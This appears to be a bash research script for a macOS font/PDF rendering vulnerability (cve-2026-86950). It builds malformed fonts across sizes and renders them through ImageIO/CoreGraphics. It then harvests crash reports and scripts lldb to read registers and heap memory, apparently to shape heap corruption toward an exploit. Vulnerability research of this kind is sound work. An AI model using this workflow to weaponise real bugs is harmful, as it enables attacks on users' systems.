#!/bin/bash
# RIP-6: head-band census — strike x22 head region (L~48-72, verified-law band, untested)
# + pattern-shape hunt (canonical heap-range patterns = mapped-follow candidates)
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYB'
import sys; sys.path.insert(0, '.')
from gen_k2 import build_font
Ls = [40,48,56,64,72,80,88,96,104,112,120,128,136,144,160,192,256,384,512,768,1024]
for L in Ls: build_font(f"k2_h{L}.ttf", L)
print("fonts built")
PYB
for L in 40 48 56 64 72 80 88 96 104 112 120 128 136 144 160 192 256 384 512 768 1024; do
  ./venv/bin/python gen_pdf.py k2_h${L}.pdf k2_h${L}.ttf
done

IPSDIR="$HOME/Library/Logs/DiagnosticReports"
./venv/bin/python - << 'PYG'
import subprocess, os, glob, sys, re, json, time
Ls = [40,48,56,64,72,80,88,96,104,112,120,128,136,144,160,192,256,384,512,768,1024]
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
out = open("headcensus.txt", "w")
def W(*a): print(*a); print(*a, file=out)
for L in Ls:
    before = set(glob.glob(IPS + "/render4*.ips"))
    r = subprocess.run(['./render4', f'k2_h{L}.pdf', 'h.png'], capture_output=True, timeout=120)
    err = r.stderr.decode(errors='replace')
    done = 'PHASE done' in err
    rel = 'REL_CB fired' in err
    time.sleep(1.0)
    new = [f for f in glob.glob(IPS + "/render4*.ips") if f not in before]
    site = '-'
    if new:
        new.sort(key=os.path.getmtime)
        try:
            raw = json.loads(open(new[-1]).read().split('\n', 1)[1])
            ft = raw.get('faultingThread', 0)
            thr = raw.get('threads', [{}])[ft] if raw.get('threads') else {}
            frs = thr.get('frames', [])
            site = " <- ".join("%s+%s@%s" % (frs[i].get('symbol','?'), frs[i].get('symbolLocation',''), frs[i].get('imageOffset','')) for i in range(min(3, len(frs))))
            ex = raw.get('exception', {})
            site = "addr=%s | %s" % (ex.get('address', ex.get('faultAddress', '-')), site)
        except Exception as e:
            site = "parse-err %s" % e
        os.rename(new[-1], f"ips_h{L}.ips")
    W("L=%4d rc=%3d done=%s rel=%s" % (L, r.returncode, done, rel))
    W("   %s" % site[:240])
out.close()
print("HEAD CENSUS DONE")
PYG

# traced head-band: x22/x27 delta at L=64 and L=72
for LL in 64 72; do
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_h${LL}.pdf hh.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  echo "memory read --size 8 --count 24 --format x \$x22-16"
  echo "breakpoint delete 2"
  echo "quit"
} > cmdsH${LL}.txt
lldb -b -s cmdsH${LL}.txt ./render4 > sessH${LL}.txt 2>&1 || true
grep -E "x27 =|x22 =|^0x" sessH${LL}.txt | head -8
done

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{headcensus.txt,sessH64.txt,sessH72.txt} findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_h*.ips findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/headcensus.txt | head -50
